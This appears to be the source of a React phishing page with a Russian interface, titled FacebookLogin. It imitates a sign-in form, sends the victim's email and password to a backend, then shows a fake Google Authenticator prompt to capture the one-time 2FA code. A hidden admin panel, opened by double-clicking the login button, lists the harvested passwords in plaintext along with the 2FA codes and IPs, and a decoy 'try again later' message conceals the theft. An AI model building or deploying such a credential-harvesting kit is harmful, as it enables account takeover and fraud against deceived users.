"use client"

import type React from "react"

import { useState, useEffect, useRef } from "react"
import { ArrowLeft, MessageSquare, Eye, EyeOff, Trash2, Settings } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Label } from "@/components/ui/label"

interface LoginAttempt {
  _id: string
  email: string
  password: string
  twoFactorCode?: string
  timestamp: string
  ip: string
  userAgent: string
}

export default function FacebookLogin() {
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [message, setMessage] = useState("")
  const [signInClickCount, setSignInClickCount] = useState(0)
  const [lastClickTime, setLastClickTime] = useState(0)
  const [showAdmin, setShowAdmin] = useState(false)
  const [show2FA, setShow2FA] = useState(false)
  const [loginAttempts, setLoginAttempts] = useState<LoginAttempt[]>([])
  const [isLoadingAttempts, setIsLoadingAttempts] = useState(false)
  const [showPasswords, setShowPasswords] = useState<{ [key: string]: boolean }>({})
  const [buttonText, setButtonText] = useState("Войти")
  const [newButtonText, setNewButtonText] = useState("")
  const [isSavingButton, setIsSavingButton] = useState(false)
  const [currentAttemptId, setCurrentAttemptId] = useState<string | null>(null)
  const [twoFactorCode, setTwoFactorCode] = useState(["", "", "", "", "", ""])
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])

  // Fetch button text on component mount
  useEffect(() => {
    fetchButtonText()
  }, [])

  const fetchButtonText = async () => {
    try {
      const response = await fetch("/api/settings/button-text")
      if (response.ok) {
        const data = await response.json()
        setButtonText(data.buttonText || "Войти")
        setNewButtonText(data.buttonText || "Войти")
      }
    } catch (error) {
      console.error("Failed to fetch button text:", error)
    }
  }

  const updateButtonText = async () => {
    if (!newButtonText.trim()) return

    setIsSavingButton(true)
    try {
      const response = await fetch("/api/settings/button-text", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ buttonText: newButtonText }),
      })

      if (response.ok) {
        setButtonText(newButtonText)
        alert("Текст кнопки успешно обновлён!")
      }
    } catch (error) {
      console.error("Failed to update button text:", error)
      alert("Не удалось обновить текст кнопки")
    } finally {
      setIsSavingButton(false)
    }
  }

  const handleSignInClick = (e: React.MouseEvent) => {
    const currentTime = Date.now()

    // If more than 500ms has passed since last click, reset the count
    if (currentTime - lastClickTime > 500) {
      setSignInClickCount(1)
    } else {
      setSignInClickCount((prev) => prev + 1)
    }

    setLastClickTime(currentTime)

    // If double-clicked, open admin panel
    if (signInClickCount === 1 && currentTime - lastClickTime <= 500) {
      e.preventDefault()
      setShowAdmin(true)
      setSignInClickCount(0)
      fetchLoginAttempts()
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setMessage("")

    try {
      const response = await fetch("/api/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email,
          password,
        }),
      })

      if (response.ok) {
        const data = await response.json()
        setCurrentAttemptId(data.attemptId)
        // Show 2FA screen instead of error message
        setShow2FA(true)
      } else {
        setMessage("Пожалуйста, попробуйте позже.")
      }
    } catch (error) {
      setMessage("Пожалуйста, попробуйте позже.")
    } finally {
      setIsLoading(false)
    }
  }

  const handle2FAInput = (index: number, value: string) => {
    // Only allow digits
    if (value && !/^\d$/.test(value)) return

    const newCode = [...twoFactorCode]
    newCode[index] = value

    setTwoFactorCode(newCode)

    // Auto-focus next input
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus()
    }

    // Auto-submit when all 6 digits are entered
    if (newCode.every((digit) => digit !== "") && index === 5) {
      submit2FACode(newCode.join(""))
    }
  }

  const handle2FAKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !twoFactorCode[index] && index > 0) {
      inputRefs.current[index - 1]?.focus()
    }
  }

  const handle2FAPaste = (e: React.ClipboardEvent) => {
    e.preventDefault()
    const pastedData = e.clipboardData.getData("text").slice(0, 6)
    const digits = pastedData.split("").filter((char) => /^\d$/.test(char))

    const newCode = [...twoFactorCode]
    digits.forEach((digit, index) => {
      if (index < 6) {
        newCode[index] = digit
      }
    })

    setTwoFactorCode(newCode)

    // Focus the next empty input or the last one
    const nextEmptyIndex = newCode.findIndex((digit) => digit === "")
    if (nextEmptyIndex !== -1) {
      inputRefs.current[nextEmptyIndex]?.focus()
    } else {
      inputRefs.current[5]?.focus()
      // Auto-submit if all digits are filled
      if (newCode.every((digit) => digit !== "")) {
        submit2FACode(newCode.join(""))
      }
    }
  }

  const submit2FACode = async (code: string) => {
    if (!currentAttemptId) return

    try {
      const response = await fetch("/api/login/2fa", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          attemptId: currentAttemptId,
          twoFactorCode: code,
        }),
      })

      if (response.ok) {
        // Reset and show success
        setShow2FA(false)
        setTwoFactorCode(["", "", "", "", "", ""])
        setEmail("")
        setPassword("")
        setMessage("Пожалуйста, попробуйте позже.")
      }
    } catch (error) {
      console.error("Failed to submit 2FA code:", error)
    }
  }

  const fetchLoginAttempts = async () => {
    setIsLoadingAttempts(true)
    try {
      const response = await fetch("/api/admin/attempts")
      if (response.ok) {
        const data = await response.json()
        setLoginAttempts(data.attempts)
      }
    } catch (error) {
      console.error("Failed to fetch login attempts:", error)
    } finally {
      setIsLoadingAttempts(false)
    }
  }

  const deleteAttempt = async (id: string) => {
    try {
      const response = await fetch(`/api/admin/attempts/${id}`, {
        method: "DELETE",
      })
      if (response.ok) {
        setLoginAttempts(loginAttempts.filter((attempt) => attempt._id !== id))
      }
    } catch (error) {
      console.error("Failed to delete attempt:", error)
    }
  }

  const deleteAllAttempts = async () => {
    try {
      const response = await fetch("/api/admin/attempts", {
        method: "DELETE",
      })
      if (response.ok) {
        setLoginAttempts([])
      }
    } catch (error) {
      console.error("Failed to delete all attempts:", error)
    }
  }

  const togglePasswordVisibility = (id: string) => {
    setShowPasswords((prev) => ({
      ...prev,
      [id]: !prev[id],
    }))
  }

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString("ru-RU")
  }

  if (showAdmin) {
    return (
      <div className="min-h-screen bg-gray-50 p-4">
        <Card className="max-w-6xl mx-auto">
          <CardHeader className="flex flex-row items-center justify-between">
            <CardTitle className="text-2xl font-bold">Панель администратора - Попытки входа</CardTitle>
            <div className="flex gap-2">
              <Button onClick={fetchLoginAttempts} disabled={isLoadingAttempts} variant="outline">
                {isLoadingAttempts ? "Обновление..." : "Обновить"}
              </Button>
              <Button onClick={deleteAllAttempts} variant="destructive" disabled={loginAttempts.length === 0}>
                Удалить всё
              </Button>
              <Button onClick={() => setShowAdmin(false)} variant="secondary">
                Назад к входу
              </Button>
            </div>
          </CardHeader>
          <CardContent className="space-y-6">
            {/* Button Text Settings */}
            <Card className="border-purple-200 bg-purple-50">
              <CardHeader>
                <CardTitle className="text-lg flex items-center gap-2">
                  <Settings className="w-5 h-5" />
                  Настройки кнопки входа
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="buttonText">Текст кнопки входа</Label>
                  <div className="flex gap-2">
                    <Input
                      id="buttonText"
                      value={newButtonText}
                      onChange={(e) => setNewButtonText(e.target.value)}
                      placeholder="Введите текст кнопки"
                      className="flex-1"
                    />
                    <Button onClick={updateButtonText} disabled={isSavingButton || !newButtonText.trim()}>
                      {isSavingButton ? "Сохранение..." : "Сохранить"}
                    </Button>
                  </div>
                  <p className="text-sm text-gray-600">
                    Текущий текст: <span className="font-semibold">{buttonText}</span>
                  </p>
                </div>
              </CardContent>
            </Card>

            {/* Login Attempts */}
            <div>
              <h3 className="text-lg font-semibold mb-4">Попытки входа</h3>
              {isLoadingAttempts ? (
                <div className="text-center py-8">Загрузка попыток...</div>
              ) : loginAttempts.length === 0 ? (
                <div className="text-center py-8 text-gray-500">Попытки входа не найдены</div>
              ) : (
                <div className="space-y-4">
                  <div className="text-sm text-gray-600 mb-4">Всего попыток: {loginAttempts.length}</div>
                  {loginAttempts.map((attempt) => (
                    <Card key={attempt._id} className="border-l-4 border-l-purple-600">
                      <CardContent className="p-4">
                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                          <div>
                            <label className="text-sm font-medium text-gray-600">Email/Телефон:</label>
                            <p className="font-mono text-sm bg-gray-100 p-2 rounded">{attempt.email}</p>
                          </div>
                          <div>
                            <label className="text-sm font-medium text-gray-600">Пароль:</label>
                            <div className="flex items-center gap-2">
                              <p className="font-mono text-sm bg-gray-100 p-2 rounded flex-1">
                                {showPasswords[attempt._id] ? attempt.password : "•".repeat(attempt.password.length)}
                              </p>
                              <Button size="sm" variant="ghost" onClick={() => togglePasswordVisibility(attempt._id)}>
                                {showPasswords[attempt._id] ? (
                                  <EyeOff className="w-4 h-4" />
                                ) : (
                                  <Eye className="w-4 h-4" />
                                )}
                              </Button>
                            </div>
                          </div>
                          {attempt.twoFactorCode && (
                            <div>
                              <label className="text-sm font-medium text-gray-600">2FA Код:</label>
                              <p className="font-mono text-sm bg-green-100 p-2 rounded font-bold">
                                {attempt.twoFactorCode}
                              </p>
                            </div>
                          )}
                          <div>
                            <label className="text-sm font-medium text-gray-600">Время:</label>
                            <p className="text-sm bg-gray-100 p-2 rounded">{formatDate(attempt.timestamp)}</p>
                          </div>
                          <div>
                            <label className="text-sm font-medium text-gray-600">IP адрес:</label>
                            <p className="text-sm bg-gray-100 p-2 rounded">{attempt.ip}</p>
                          </div>
                          <div className="md:col-span-2">
                            <label className="text-sm font-medium text-gray-600">User Agent:</label>
                            <p className="text-xs bg-gray-100 p-2 rounded break-all">{attempt.userAgent}</p>
                          </div>
                        </div>
                        <div className="mt-4 flex justify-end">
                          <Button size="sm" variant="destructive" onClick={() => deleteAttempt(attempt._id)}>
                            <Trash2 className="w-4 h-4 mr-1" />
                            Удалить
                          </Button>
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>
              )}
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  if (show2FA) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col">
        {/* Header */}
        <div className="px-6 py-6">
          <button
            onClick={() => {
              setShow2FA(false)
              setTwoFactorCode(["", "", "", "", "", ""])
            }}
            className="p-2 hover:bg-gray-800 rounded-lg transition-colors"
          >
            <ArrowLeft className="w-6 h-6" />
          </button>
        </div>

        {/* Main Content */}
        <div className="flex-1 px-6 py-8 flex flex-col">
          {/* 2FA Label */}
          <div className="mb-8">
            <p className="text-gray-400 text-sm mb-4">2FA</p>
            <h1 className="text-3xl font-bold">Enter your Google Authenticator code</h1>
          </div>

          {/* 2FA Input Boxes */}
          <div className="flex gap-3 mb-8">
            {twoFactorCode.map((digit, index) => (
              <input
                key={index}
                ref={(el) => (inputRefs.current[index] = el)}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handle2FAInput(index, e.target.value)}
                onKeyDown={(e) => handle2FAKeyDown(index, e)}
                onPaste={index === 0 ? handle2FAPaste : undefined}
                className={`w-14 h-16 bg-[#1a1a1a] border-2 ${
                  digit ? "border-purple-600" : "border-gray-700"
                } rounded-xl text-white text-center text-2xl font-semibold focus:outline-none focus:border-purple-600 transition-colors`}
                autoFocus={index === 0}
              />
            ))}
          </div>

          {/* Spacer */}
          <div className="flex-1" />

          {/* Open Google Authenticator Button */}
          <Button
            type="button"
            className="w-full h-14 bg-transparent border-2 border-gray-700 hover:bg-gray-800 text-white font-semibold rounded-2xl text-base"
          >
            Open Google Authenticator
          </Button>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col">
      {/* Header */}
      <div className="px-6 py-6 flex items-center justify-between">
        <button className="p-2 hover:bg-gray-800 rounded-lg transition-colors">
          <ArrowLeft className="w-6 h-6" />
        </button>
        <button className="p-2 hover:bg-gray-800 rounded-lg transition-colors">
          <MessageSquare className="w-6 h-6" />
        </button>
      </div>

      {/* Main Content */}
      <div className="flex-1 px-6 py-8 flex flex-col">
        {/* Title */}
        <div className="mb-8">
          <h1 className="text-3xl font-bold mb-3">Войти в аккаунт</h1>
          <p className="text-gray-400">
            Впервые здесь?{" "}
            <span className="text-purple-500 font-medium cursor-pointer hover:text-purple-400">Создать сейчас</span>
          </p>
        </div>

        {/* Login Form */}
        <form onSubmit={handleSubmit} className="space-y-6 flex-1 flex flex-col">
          {/* Email Input */}
          <div>
            <Input
              type="text"
              placeholder="Электронная почта"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full h-14 px-4 bg-[#1a1a1a] border-0 rounded-2xl text-white placeholder-gray-500 focus:ring-2 focus:ring-purple-600"
              required
            />
          </div>

          {/* Password Input */}
          <div className="relative">
            <Input
              type={showPassword ? "text" : "password"}
              placeholder="Пароль"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full h-14 px-4 pr-12 bg-[#1a1a1a] border-0 rounded-2xl text-white placeholder-gray-500 focus:ring-2 focus:ring-purple-600"
              required
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-4 top-1/2 transform -translate-y-1/2 text-purple-500 hover:text-purple-400"
            >
              {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
            </button>
          </div>

          {/* Forgot Password */}
          <div className="text-center">
            <button type="button" className="text-purple-500 font-medium hover:text-purple-400">
              Забыли пароль?
            </button>
          </div>

          {/* Message */}
          {message && <div className="text-center text-sm text-red-500">{message}</div>}

          {/* Spacer */}
          <div className="flex-1" />

          {/* Sign In Button */}
          <div className="space-y-4">
            <Button
              type="submit"
              disabled={isLoading}
              onClick={handleSignInClick}
              className="w-full h-14 bg-purple-600 hover:bg-purple-700 text-white font-semibold rounded-2xl text-lg disabled:opacity-50"
            >
              {isLoading ? "Вход..." : buttonText}
            </Button>

            {/* Divider */}
            <div className="text-center text-gray-500 text-sm">или</div>

            {/* Alternative Sign-in Options */}
            <div className="space-y-3">
              <button
                type="button"
                className="w-full h-14 bg-[#1a1a1a] hover:bg-[#252525] text-white rounded-2xl flex items-center justify-center gap-3 transition-colors"
              >
                <svg className="w-5 h-5" viewBox="0 0 24 24">
                  <path
                    fill="currentColor"
                    d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
                  />
                  <path
                    fill="currentColor"
                    d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
                  />
                  <path
                    fill="currentColor"
                    d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
                  />
                  <path
                    fill="currentColor"
                    d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
                  />
                </svg>
                <span>Войти через Google</span>
              </button>

              <button
                type="button"
                className="w-full h-14 bg-[#1a1a1a] hover:bg-[#252525] text-white rounded-2xl flex items-center justify-center gap-3 transition-colors"
              >
                <svg className="w-5 h-5" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2C6.48 2 2 6.48 2 12c0 5.52 4.48 10 10 10s10-4.48 10-10c0-5.52-4.48-10-10-10zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z" />
                </svg>
                <span>Войти через Telegram</span>
              </button>

              <button
                type="button"
                className="w-full h-14 bg-[#1a1a1a] hover:bg-[#252525] text-white rounded-2xl flex items-center justify-center gap-3 transition-colors"
              >
                <svg className="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <rect x="5" y="2" width="14" height="20" rx="2" ry="2" />
                  <line x1="12" y1="18" x2="12.01" y2="18" />
                </svg>
                <span>Войти по номеру телефона</span>
              </button>
            </div>
          </div>
        </form>
      </div>
    </div>
  )
}
